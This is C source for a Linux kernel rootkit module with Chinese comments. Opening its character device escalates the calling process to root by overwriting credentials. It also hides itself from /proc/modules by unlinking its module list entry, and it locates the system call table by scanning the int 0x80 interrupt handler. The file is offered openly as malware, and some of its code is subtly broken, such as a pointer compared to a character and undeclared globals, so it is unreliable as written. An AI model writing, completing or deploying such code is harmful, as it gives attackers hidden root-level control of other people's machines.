#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/device.h>
#include "rootkit.h"

// 修改cred获得root权限
void get_root(void)
{
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (newcreds == NULL)
        return;
    newcreds->uid.val = newcreds->gid.val = 0;
    newcreds->euid.val = newcreds->egid.val = 0;
    newcreds->suid.val = newcreds->sgid.val = 0;
    newcreds->fsuid.val = newcreds->fsgid.val = 0;
    commit_creds(newcreds);
}

static int rootkit_open(struct inode *__inode, struct file *__file)
{
    get_root();
    return 0;
}

static ssize_t rootkit_read(struct file *__file, char __user *user_buf, size_t size, loff_t *__loff)
{
    printk(KERN_INFO "get info");

    return 0;
}

static ssize_t rootkit_write(struct file *__file, const char __user *user_buf, size_t size, loff_t *__loff)
{
    printk(KERN_INFO "set root");

    return 0;
}

static int rootkit_release(struct inode *__inode, struct file *__file)
{
    return 0;
}

static long rootkit_ioctl(struct file *__file, unsigned int cmd, unsigned long param)
{
    return 0;
}
// 模块隐藏函数定义
static inline void module_info(void)
{
    prev = THIS_MODULE->list.prev;
}
static void hide_myself(void)
{
    // 摘除链表，/proc/modules中不可见
    list_del_init(&THIS_MODULE->list);

    // 摘除kobj，/sys/modules/中不可见。
    // kobject_del(&THIS_MODULE->mkobj.kobj);

    list_add(&THIS_MODULE->list, prev);
    // kobject_put(&mod.mkobj.kobj);
}

// 查找sys_call_table地址函数定义
static void
disp_sys_call_table(void)
{
    unsigned int sys_call_off;
    unsigned int sys_call_table;
    char *p;
    int i;

    // 获取中断描述符寄存器地址
    asm("sidt %0"
        : "=m"(idtr));
    printk("addr of idtr:%x\n", &idtr);

    // 获取0x80中断处理程序的地址
    memcpy(&idt, idtr.base + 8 * 0x80, sizeof(idt));
    sys_call_off = ((idt.off2 << 16) | idt.off1);
    printk("addr of idt 0x80: %x\n", sys_call_off);

    // 从0x80中断服务例程中搜索sys_call_table的地址
    p = sys_call_off;
    for (i = 0; i < 100; i++)
    {
        if (p == '\xff' && p[i + 1] == '\x14' && p[i + 2] == '\x85')
        {
            sys_call_table = *(unsigned int *)(p + i + 3);
            printk("addr of sys_call_table: %x\n", sys_call_table);
            return;
        }
    }
}
